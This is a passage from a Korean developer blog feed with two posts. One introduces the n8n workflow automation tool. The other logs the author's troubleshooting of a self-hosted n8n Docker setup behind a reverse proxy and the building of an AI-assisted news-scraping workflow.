<p>n8n(Nodemation)은 워크플로우 자동화 도구로, Zapier나 Make와 유사한 기능을 제공하지만 몇 가지 차별점을 가진다. 가장 주목할 만한 특징은 <strong>셀프 호스팅(Self-hosting)</strong>이 가능하다는 점이다. 이는 Docker 등을 활용하여 직접 서버에 설치함으로써 비용을 절감하고 데이터 통제권을 확보할 수 있다는 점에서, 특히 개인 프로젝트나 민감한 데이터를 다루는 환경에서 큰 이점을 제공한다.</p>

<p>n8n의 핵심적인 작동 방식은 <strong>노드 기반 시각화(Node-based visualization)</strong>에 있다. 모든 자동화 과정은 ‘노드(Node)’라는 블록으로 표현되며, 이 노드들을 시각적으로 연결하여 전체 자동화 흐름, 즉 <strong>워크플로우(Workflow)</strong>를 구성한다. 워크플로우는 자동화 작업의 전체 단위이며, PRD에서 정의한 콘텐츠 수집부터 기록까지의 선형적인 과정을 하나의 워크플로우로 구현할 수 있다.</p>

<p>n8n은 <strong>개발자 친화적(Developer-friendly)</strong>이라는 점도 강점이다. 기본 제공되는 다양한 노드만으로도 복잡한 자동화를 구현할 수 있지만, 필요에 따라 <code class="language-plaintext highlighter-rouge">Code</code> 노드를 통해 Node.js 기반의 JavaScript로 직접 로직을 작성하거나 외부 라이브러리를 연동하는 것이 가능하다. 이는 기존 도구에서 제공하지 않는 특정 기능을 구현해야 할 때 유용하다.</p>

<p>n8n을 이해하기 위한 네 가지 핵심 구성 요소는 다음과 같다.</p>

<h3 id="1-워크플로우-workflow">1. 워크플로우 (Workflow)</h3>

<p>자동화 작업의 전체적인 단위이자, 노드들이 배치되는 ‘캔버스’ 역할을 한다.</p>

<h3 id="2-노드-node">2. 노드 (Node)</h3>

<p>워크플로우를 구성하는 최소 작업 단위이다.</p>

<ul>
  <li><strong>트리거 노드 (Trigger Nodes):</strong> 워크플로우를 시작시키는 역할을 한다. <code class="language-plaintext highlighter-rouge">Schedule</code> (예약 실행), <code class="language-plaintext highlighter-rouge">Webhook</code> (외부 시스템 호출), <code class="language-plaintext highlighter-rouge">Manual</code> (수동 실행) 등이 대표적이다.</li>
  <li><strong>일반 노드 (Regular Nodes):</strong> 실제 작업을 수행하는 노드들이다. 데이터를 가져오거나, 가공하거나, 전송하는 등의 역할을 담당하며, <code class="language-plaintext highlighter-rouge">HTTP Request</code>, <code class="language-plaintext highlighter-rouge">Google AI</code>, <code class="language-plaintext highlighter-rouge">Discord</code>, <code class="language-plaintext highlighter-rouge">Git</code>, <code class="language-plaintext highlighter-rouge">Code</code> 등이 이에 해당한다.</li>
</ul>

<h3 id="3-데이터-흐름-data-flow--json">3. 데이터 흐름 (Data Flow &amp; JSON)</h3>

<p>n8n의 가장 핵심적인 개념으로, 모든 데이터는 노드 간에 <strong>JSON 배열(Array of JSON objects)</strong> 형태로 전달된다. 앞선 노드의 출력이 다음 노드의 입력이 되는 방식으로, 데이터 구조는 보통 <code class="language-plaintext highlighter-rouge">[ { "data": "value" } ]</code> 형태를 가진다.</p>

<h3 id="4-표현식-expressions">4. 표현식 (Expressions)</h3>

<p>이전 노드의 데이터를 현재 노드에서 참조하는 방식이다. n8n은 <code class="language-plaintext highlighter-rouge">\{\{ ... \}\}</code> 형태의 표현식을 사용하며, <code class="language-plaintext highlighter-rouge">$node["Node Name"].json.data</code> 와 같이 특정 노드의 출력 데이터를 참조하는 것이 일반적이다.</p>

<h3 id="5-자격-증명-credentials">5. 자격 증명 (Credentials)</h3>

<p>Google AI API 키, GitHub PAT, Discord Webhook URL 등 민감한 정보를 n8n에 안전하게 저장하고 관리하는 기능이다. 노드 설정 시 실제 키 값 대신 등록된 자격 증명을 선택하여 보안을 유지한다.</p>

<p>이러한 n8n의 특징과 구성 요소를 이해하는 것은 자동화 프로젝트를 성공적으로 수행하는 데 필수적이다.</p>

<h2 id="왜-쓰는가">왜 쓰는가?</h2>

<p>이제 AI 를 Agent 처럼 구축할 필요가 있다..!
그런데 프레임워크 기반의 서버로 구축하긴 너무 오래 걸리는데, 이때 n8n 은 아주 완벽한 PoC 용 툴이다.</p>]]></content><author><name>Paul2021-R</name></author><category term="학습" /><category term="학습" /><category term="Automation" /><category term="AI" /><category term="Google" /><category term="n8n" /><summary type="html"><![CDATA[n8n 자동화 도구 소개]]></summary></entry><entry><title type="html">TIL - n8n 으로 뉴스 피드 자동화 해서 Discord 레터 받아보기(feat AI)</title><link href="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/11/09/02-til-n8n.html" rel="alternate" type="text/html" title="TIL - n8n 으로 뉴스 피드 자동화 해서 Discord 레터 받아보기(feat AI)" /><published>2025-11-09T00:00:00+00:00</published><updated>2025-11-09T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/11/09/02-til-n8n</id><content type="html" xml:base="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/11/09/02-til-n8n.html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>주말엔 본 목적을 위한 작업을 하는것은 너무 머리 아픈 일이다. 가뜩이나 DevOps 는 하나 하나 하다보면서 알게되는게 너무 많았다. 그래서 평상시에도 꼭 배우리라 생각했던 n8n 기반의 자동화, 비로소 작업해보았다…!</p>

<h2 id="0단계---connection-lost--응-1">0단계 - connection lost … 응? (1)</h2>

<p>n8n 을 다른 서버에서 사용하는 것도 가능은 하다. 하지만 이왕 하는거 셀프 호스팅을 도전해보았다.</p>

<p><img src="/assets/images/posts/2025-11/20251111-013.png" alt="" /></p>
<blockquote>
  <p>Node 를 Create 했는데 우상단에 <code class="language-plaintext highlighter-rouge">Connection lost</code> 가 보임</p>
</blockquote>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Blocked GET /assets/npsSurvey.store-B7_iNEDS.js <span class="k">for</span> <span class="s2">"Mozilla/5.0 (compatible; archive.org_bot; Wayback Machine Live Record; +http://archive.org/details/archive.org_bot)"</span>

Pruning old insights data

Pruning old insights data

Pruning old insights data

ValidationError: The <span class="s1">'X-Forwarded-For'</span> header is <span class="nb">set </span>but the Express <span class="s1">'trust proxy'</span> setting is <span class="nb">false</span> <span class="o">(</span>default<span class="o">)</span><span class="nb">.</span> This could indicate a misconfiguration which would prevent express-rate-limit from accurately identifying users. See https://express-rate-limit.github.io/ERR_ERL_UNEXPECTED_X_FORWARDED_FOR/ <span class="k">for </span>more information.

    at Object.xForwardedForHeader <span class="o">(</span>/usr/local/lib/node_modules/n8n/node_modules/.pnpm/express-rate-limit@7.5.0_express@5.1.0/node_modules/express-rate-limit/dist/index.cjs:187:13<span class="o">)</span>

    at Object.wrappedValidations.&lt;computed&gt; <span class="o">[</span>as xForwardedForHeader] <span class="o">(</span>/usr/local/lib/node_modules/n8n/node_modules/.pnpm/express-rate-limit@7.5.0_express@5.1.0/node_modules/express-rate-limit/dist/index.cjs:398:22<span class="o">)</span>

    at Object.keyGenerator <span class="o">(</span>/usr/local/lib/node_modules/n8n/node_modules/.pnpm/express-rate-limit@7.5.0_express@5.1.0/node_modules/express-rate-limit/dist/index.cjs:671:20<span class="o">)</span>

    at /usr/local/lib/node_modules/n8n/node_modules/.pnpm/express-rate-limit@7.5.0_express@5.1.0/node_modules/express-rate-limit/dist/index.cjs:724:32

    at /usr/local/lib/node_modules/n8n/node_modules/.pnpm/express-rate-limit@7.5.0_express@5.1.0/node_modules/express-rate-limit/dist/index.cjs:704:5 <span class="o">{</span>

  code: <span class="s1">'ERR_ERL_UNEXPECTED_X_FORWARDED_FOR'</span>,

  <span class="nb">help</span>: <span class="s1">'https://express-rate-limit.github.io/ERR_ERL_UNEXPECTED_X_FORWARDED_FOR/'</span>

<span class="o">}</span>

<span class="o">[</span>license SDK] license renewal failed: Connection Error: Unexpected token <span class="s1">'B'</span>, <span class="s2">"Bad Gateway"</span> is not valid JSON

Failed to renew license: Connection Error: Unexpected token <span class="s1">'B'</span>, <span class="s2">"Bad Gateway"</span> is not valid JSON

<span class="o">[</span>license SDK] license successfully renewed
</code></pre></div></div>
<blockquote>
  <p>AI 의 친절한 조언에 따라 docker logs 를 확인하니, 문제가 뭔지 바로 파악 가능했다.</p>
</blockquote>

<p>핵심은 n8n 이 리버스 프록시 뒤에서 실행 중인데, 보안의 문제로 이에 대한 신뢰 설정이 필요하단 점이었다.</p>

<p>해결 방법은 가능하다. 환경 변수에 <code class="language-plaintext highlighter-rouge">N8N_TRUST_PROXY=1</code>를 추가하면 된다. 컨테이너 화든 셀프 호스팅이든 자신의 환경에 맞춰 추가하면 된다. 본인은 Docker container 기반으로 해두었기에 yml 파일에 env 변수를 추가해주었다.</p>

<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="c1"># - N8N_SECURE_COOKIE=false # 1. HTTPS가 아니어도 쿠키 사용 허용 # 프록시 있으니 해제</span>
      <span class="pi">-</span> <span class="s">WEBHOOK_URL=https://n8n.paulryu93.ddns.net</span> <span class="c1"># 2. n8n의 공개 주소 설정</span>
      <span class="pi">-</span> <span class="s">N8N_TRUST_PROXY=1</span> <span class="c1"># 리버스 프록시 신뢰 설정 </span>
      <span class="pi">-</span> <span class="s">TZ=Asia/Seoul</span> <span class="c1"># 시간 설정 </span>
      <span class="pi">-</span> <span class="s">NODE_FUNCTION_ALLOW_EXTERNAL=cheerio,axios</span> <span class="c1"># 외부 모듈 설치 요청</span>
      <span class="pi">-</span> <span class="s">EXECUTIONS_DATA_PRUNE=true</span> <span class="c1"># 로깅 데이터 저장 및 자동 삭제 활성화</span>
      <span class="pi">-</span> <span class="s">EXECUTIONS_DATA_MAX_AGE=168</span> <span class="c1"># 로깅 데이터 저장 기간 7일로 지정</span>
</code></pre></div></div>

<p>이제 재시작하면 된다.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker compose up <span class="nt">-d</span> <span class="nt">--force-recreate</span>
</code></pre></div></div>

<h2 id="0단계---또-다른-connection-lost-2">0단계 - 또 다른 connection lost (2)</h2>
<p>분명히 가이드 문서를 찾아봐도 이걸로 해결 되는 거였다. 근데 안됨. 뭐지? 하고 찾아보니 ‘n8n 에디터’는 웹소켓으로 실시간 통신을 한다고 되어 있고, 해당 기능이 설정되어야 한다고 했다.</p>

<p><img src="/assets/images/posts/2025-11/20251111-014.png" alt="" /></p>
<blockquote>
  <p>Websockets Support 옵션을 켜면</p>
</blockquote>

<p><img src="/assets/images/posts/2025-11/20251111-015.png" alt="" /></p>
<blockquote>
  <p>짠, 해결 완료 되었다.</p>
</blockquote>

<p>결국 n8n의 환경 변수 설정 + Socket 통신 허용을 해줘야만 n8n 에디터를 제대로 셀프 호스팅이 가능하다.</p>

<h2 id="새로운-문제">새로운 문제…</h2>

<p>알고 보니 Connection Lost 에러와</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  code: <span class="s1">'ERR_ERL_UNEXPECTED_X_FORWARDED_FOR'</span>,

  <span class="nb">help</span>: <span class="s1">'https://express-rate-limit.github.io/ERR_ERL_UNEXPECTED_X_FORWARDED_FOR/'</span>
</code></pre></div></div>
<p>이 에러는 실질 다른 문제가 있었다. 
이는 현재 메인 서비스를 위한 HTTPS 할당과 별도로 TLS L4 레이어 기반으로 우회를 하여 공인 IP 를 지나, 서브 서버의 443 포트로 전송 되는 문제로 발생한 이슈였다.</p>

<p>이 에러가 문제시 되는 이유는, 현재 설정이 꼬여 IP 가 하나로 들어오는 것처럼 처리 된다는 점이다.</p>

<p>문제의 핵심은 정리해보니… stream 블록으로 우회하는 데, 이 우회 프로토콜을 NPM Plus 는 제대로 아직 인식이 안된다.</p>

<p>즉, Sub-Server 에 Nginx 를 추가하고 HTTPS 를 다시 인증 받아야한다는점이다(…)</p>
<h2 id="1단계---n8n-워크플로우-생성-및-rss-데이터-가져오기">1단계 - n8n 워크플로우 생성 및 RSS 데이터 가져오기</h2>
<p><img src="/assets/images/posts/2025-11/20251111-016.png" alt="" /></p>
<ul>
  <li>n8n 은 대단히 직관적이었다. 기본적으로 자동화 툴이다보니 기본적으로 <code class="language-plaintext highlighter-rouge">create Workflow</code>를 통해 사용이 가능했고, 만들어진 창의 모습도 직관적이었다.</li>
</ul>

<h2 id="2단계---trigger-설정하기">2단계 - trigger 설정하기</h2>
<p><img src="/assets/images/posts/2025-11/20251111-017.png" alt="" /></p>
<ul>
  <li>설명이랄 것도 없이, 바로 시작하면 각 단위는 ‘노드’ 라고 하는데 최초의 자동화 동작을 뭘로 할 지를 정할 수 있다.</li>
  <li>수동 혹은 app 이벤트, 스케쥴 등 생각할만한 다양한 방법은 존재하며, 심지어 file changes 까지 있는거 보면, 이건 필요한 자동화 마다 골라서 설정하면 된다.</li>
</ul>

<h2 id="3단계---노드-설정">3단계 - 노드 설정</h2>
<p><img src="/assets/images/posts/2025-11/20251111-018.png" alt="" /></p>
<ul>
  <li>이 다음 부터는 사실상 러닝커브다. 각 노드들은 기능들이 있고, 기능들은 수십가지가 있으며, AI 관련해서도 대응이 되어 있다.필요한건 핵심 로직을 어떻게 짤지 해놓고 거기에 필요한 적절한 설정에 따라 데이터를 가공하고, 합치고, 어레이로 정리하거나 하면 된다.</li>
  <li>단 여기서 주의 해야 할 것은 통신 과정에서 json 기반으로 동작하고, Code 노드의 경우 js나 Python 으로 직접 변수 형태로 접근하여 사용이 가능하다. 여기 부분에 바이브 코딩을 같이 얹어주면 직접인 데이터 가공, 저장, 그리고 검색 등을 포함한 serverless 서버까지도 넘겨 볼 수 도있다. (물론 난이도가 올라가지만, 코드를 짜는거에 비하면 양반이긴 하니까…)</li>
</ul>

<h2 id="4단계---ai-활용하기">4단계 - AI 활용하기</h2>
<p><img src="/assets/images/posts/2025-11/20251111-019.png" alt="" /></p>
<ul>
  <li>n8n 을 써봐야 하고 써보면서 알아두려고 했던 영역이 바로 이것. 바로 AI 기능이 내부에 내장되어 있다는 것이다. 원래 API 등에 따라 웹훅, 혹은 다양한 트리깅으로 자동화 자체에만 집중했다면 n8n 은 AI 기능들을 추가함으로써 AI 빌더가 되었다고 보여진다.</li>
  <li>기본적으로 자체적으로 제공해주는 기능도 있기에 <code class="language-plaintext highlighter-rouge">credentials</code>만 설정하면 손쉽게 사용이 가능하다.</li>
  <li>특히 주의 깊게 본 것은 기본 노드 뿐만 아니라 ‘AI Agent’ 노드 였다.  mcp, 메모리용 DB 등 연결이 가능하고, 직접적으로 조절이 되면서 모델을 마음데로 바꿀 수 있었다. 또한 그 외에도 AI 를 위한 파서나, Text classifier, chain 등 배워두면 도움이 아주 될 것이란 생각이 들었다. (그만한 시간을 들여야 겠지만)</li>
</ul>

<hr />

<h2 id="결론">결론</h2>

<p><img src="/assets/images/posts/2025-11/20251111-020.png" alt="" /></p>

<p><img src="/assets/images/posts/2025-11/20251111-021.png" alt="" /></p>

<ul>
  <li>
    <p>현재는 나에게 도움이되는 기사들, DevOps, AI, Backend 관련된 영역에 대한 기사들의 스크래핑 자동화를 만들었고, 여러 조건을 고려한 결과, 일단 현재 가장 최선으로 md 파일 형식으로 정리해주는 것으로 끝을 내었다.</p>
  </li>
  <li>
    <p>n8n 으로 만들어보다 보니 확실히 아이디어가 샘솟는다. 더욱이 Agent 노드는 생각이상으로 구성이 충실하다. 전에 대충 알아본 것에 비하면 확실히 왜 n8n 을 자동화 도구로 쓰는지, 그걸로 뭘 하고 싶어하는지, 실제 수입화의 주요 도구로 쓰는 사람들의 이유는 확실히 있어 보인다. 특히 Obsidian 이나 지식 저장, 블로그 자동화 등 AI 까지 합쳐진 상태에서 얻을 수 있는 건 확실히 많아 보여 앞으로 지속적으로 써보려고 한다.## 요약 내용</p>
  </li>
</ul>]]></content><author><name>Paul2021-R</name></author><category term="학습" /><category term="학습" /><category term="DevOps" /><category term="Docker" /><category term="n8n" /><category term="Automation" /><category term="AI" /><summary type="html"><![CDATA[Introduction 주말엔 본 목적을 위한 작업을 하는것은 너무 머리 아픈 일이다. 가뜩이나 DevOps 는 하나 하나 하다보면서 알게되는게 너무 많았다. 그래서 평상시에도 꼭 배우리라 생각했던 n8n 기반의 자동화, 비로소 작업해보았다…!]]></summary></entry></feed>